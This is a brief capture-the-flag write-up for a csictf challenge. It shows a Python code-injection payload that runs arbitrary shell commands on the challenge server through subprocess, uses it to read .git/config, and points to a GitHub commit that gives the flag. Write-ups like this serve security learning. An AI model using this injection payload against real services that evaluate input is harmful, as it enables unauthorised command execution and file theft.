**Challenge:** nc chall.csivit.com 30419

Code injection payload: `shift_cipher_key(__import__("subprocess").getoutput("<COMMAND HERE>"), 0)`

I created a simple python script to interact better with shell: `python shell.py`

Getting the Github repository URL (".git/config"): `shift_cipher_key(__import__("subprocess").getoutput("cat .git/config"), 0)`
- URL: https://github.com/alias-rahil/crypto-cli

Loot at the commits: https://github.com/alias-rahil/crypto-cli/commit/293a96b5311e825bed1853dfe94d686128ec87f0

**Flag**: csictf{2077m4y32_h45_35c4p3d}
